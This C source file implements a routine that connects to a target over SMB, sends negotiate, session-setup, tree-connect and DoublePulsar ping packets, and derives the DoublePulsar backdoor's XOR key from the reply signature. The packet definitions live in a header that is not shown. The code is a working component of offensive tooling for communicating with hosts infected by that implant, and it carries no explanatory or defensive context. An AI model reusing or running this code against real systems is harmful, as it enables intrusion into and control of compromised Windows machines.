#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <ctype.h>
#include <dirent.h>
#include <poll.h>
#include <pthread.h>
#include <math.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pwd.h>
#include <grp.h>
#include <utime.h>
#include <syslog.h>
#include <wchar.h>
#include "smb.h"

#include <errno.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

static int dp_send_all(int sock, const void *data, size_t length)
{
    const unsigned char *p = data;

    while (length != 0) {
        ssize_t n = send(sock, p, length, MSG_NOSIGNAL);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;
        p += (size_t)n;
        length -= (size_t)n;
    }
    return 0;
}

static int dp_receive_frame(int sock, unsigned char **frame, size_t *frame_length)
{
    unsigned char header[4];
    size_t offset = 0;
    size_t payload_length;
    unsigned char *buffer;

    while (offset < sizeof(header)) {
        ssize_t n = recv(sock, header + offset, sizeof(header) - offset, 0);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;
        offset += (size_t)n;
    }

    payload_length = ((size_t)header[1] << 16) |
                     ((size_t)header[2] << 8) |
                     (size_t)header[3];
    buffer = malloc(sizeof(header) + payload_length);
    if (buffer == NULL)
        return -1;

    for (offset = 0; offset < sizeof(header); ++offset)
        buffer[offset] = header[offset];

    offset = 0;
    while (offset < payload_length) {
        ssize_t n = recv(sock, buffer + sizeof(header) + offset,
                         payload_length - offset, 0);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            free(buffer);
            return -1;
        }
        if (n == 0) {
            free(buffer);
            return -1;
        }
        offset += (size_t)n;
    }

    *frame = buffer;
    *frame_length = sizeof(header) + payload_length;
    return 0;
}

static int dp_send_and_receive(int sock, const void *packet, size_t packet_length,
                               unsigned char **response, size_t *response_length)
{
    if (dp_send_all(sock, packet, packet_length) < 0)
        return -1;
    return dp_receive_frame(sock, response, response_length);
}

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    int sock;
    unsigned char *response = NULL;
    size_t response_length = 0;
    uint32_t key;

    if (ip == NULL)
        return 0;

    sock = smb_connect((char *)ip, port);
    if (sock < 0)
        return 0;

    if (dp_send_and_receive(sock, SMB_NEGOTIATE_PKT,
                            sizeof(SMB_NEGOTIATE_PKT), &response,
                            &response_length) < 0)
        goto error;
    free(response);
    response = NULL;

    if (dp_send_and_receive(sock, SMB_SESSION_SETUP_PKT,
                            sizeof(SMB_SESSION_SETUP_PKT), &response,
                            &response_length) < 0)
        goto error;
    free(response);
    response = NULL;

    if (dp_send_and_receive(sock, SMB_TREE_CONNECT_PKT,
                            sizeof(SMB_TREE_CONNECT_PKT), &response,
                            &response_length) < 0)
        goto error;
    free(response);
    response = NULL;

    if (dp_send_and_receive(sock, DP_PING_PKT, sizeof(DP_PING_PKT),
                            &response, &response_length) < 0)
        goto error;

    if (SMB_RESP_SIGNATURE_END - SMB_RESP_SIGNATURE_START != 4 ||
        response_length < (size_t)SMB_RESP_SIGNATURE_END)
        goto error;

    key = ((uint32_t)response[SMB_RESP_SIGNATURE_START] << 24) |
          ((uint32_t)response[SMB_RESP_SIGNATURE_START + 1] << 16) |
          ((uint32_t)response[SMB_RESP_SIGNATURE_START + 2] << 8) |
          (uint32_t)response[SMB_RESP_SIGNATURE_START + 3];

    free(response);
    close(sock);
    return (unsigned int)key;

error:
    free(response);
    close(sock);
    return 0;
}